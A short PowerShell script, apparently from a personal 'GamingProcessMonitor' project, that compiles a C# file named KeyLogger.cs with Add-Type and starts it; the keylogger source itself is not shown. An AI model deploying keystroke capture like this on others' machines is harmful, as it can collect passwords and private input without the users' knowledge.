function Start-KeyLogger {
    $csFilePath = "c:/Users/benme/source/repos/Powershell/GamingProcessMonitor/Scripts/KeyLogger.cs"
    Write-Output "Loading C# code from $csFilePath..."
    
    try {
        Add-Type -Path $csFilePath -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"
        Write-Output "C# code loaded successfully."
    } catch {
        Write-Output "Failed to load C# code: $_"
        return
    }

    Write-Output "Starting KeyLogger..."
    [KeyLogger]::Start() 
}

# Call the function to start the keylogger
Start-KeyLogger

Write-Output "KeyLogger stop condition triggered."

# ...existing code...
